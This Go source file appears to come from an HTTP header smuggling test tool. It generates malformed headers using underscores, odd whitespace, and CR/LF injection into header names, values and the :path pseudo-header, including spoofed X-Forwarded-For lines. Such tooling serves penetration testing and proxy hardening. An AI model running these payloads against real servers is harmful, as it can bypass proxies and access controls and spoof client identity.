package main

import (
	"fmt"
	"strings"
)

type SmugglingMethod string

const (
	HeaderSmugglingNone         SmugglingMethod = "no header smuggling"
	HeaderSmugglingUnderscore                   = "header smuggling via underscore"
	HeaderSmugglingSpacedHeader                 = "header smuggling via adding space"
	HeaderSmugglingNewlineValue                 = "header smuggling via newline in header value"
	HeaderSmugglingNewlineName                  = "header smuggling via newline in header name"
	HeaderSmugglingNewlinePath                  = "header smuggling via newline in header path"
)

var SmugglingMethods = []SmugglingMethod{
	HeaderSmugglingNone,
	HeaderSmugglingSpacedHeader,
	HeaderSmugglingUnderscore,
	HeaderSmugglingNewlinePath,
	HeaderSmugglingNewlineValue,
	HeaderSmugglingNewlineName,
}

func (s SmugglingMethod) Smuggle(h *Header, variant interface{}) {
	switch s {
	case HeaderSmugglingNone:
		// no action
	case HeaderSmugglingUnderscore:
		h.Name = strings.Replace(h.Name, "-", "_", -1)

	case HeaderSmugglingSpacedHeader:
		space := variant.(string)
		h.Name += space

	case HeaderSmugglingNewlineValue:
		v := variant.([2]string)
		newline := v[0]
		headerName := v[1]
		h.Value = fmt.Sprintf("val%s%s: %s%sfake: ", newline, h.Name, h.Value, newline)
		h.Name = headerName

	case HeaderSmugglingNewlineName:
		newline := variant.(string)
		h.Name = fmt.Sprintf("fake: val%s%s: %s%sheader: ", newline, h.Name, h.Value, newline)
		h.Value = "val"

	case HeaderSmugglingNewlinePath:
		v := variant.([2]string)
		newline := v[0]
		origPath := v[1]
		h.Value = fmt.Sprintf("%s HTTP/1.1%s%s: %s%sfake: ", origPath, newline, h.Name, h.Value, newline)
		h.Name = ":path"

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}

func (s SmugglingMethod) GetVariants(path string) (variants []interface{}) {
	newlines := []string{"\r\n", "\r", "\n"}
	switch s {
	case HeaderSmugglingNone, HeaderSmugglingUnderscore:
		return []interface{}{nil}

	case HeaderSmugglingSpacedHeader:
		return []interface{}{" ", "\t", "\v", "\u00A0", "\U000130BA"}

	case HeaderSmugglingNewlineName:
		for _, nl := range newlines {
			variants = append(variants, nl)
		}
		return

	case HeaderSmugglingNewlineValue:
		for _, nl := range newlines {
			for _, h := range []string{"header", " header", "x-forwarded-for"} {
				variants = append(variants, [2]string{nl, h})
			}
		}
		return

	case HeaderSmugglingNewlinePath:
		for _, nl := range newlines {
			variants = append(variants, [2]string{nl, path})
		}
		return

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}
